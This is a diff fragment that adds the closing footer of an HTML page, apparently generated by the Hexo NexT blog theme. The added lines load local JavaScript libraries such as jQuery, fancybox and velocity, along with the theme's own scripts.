+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
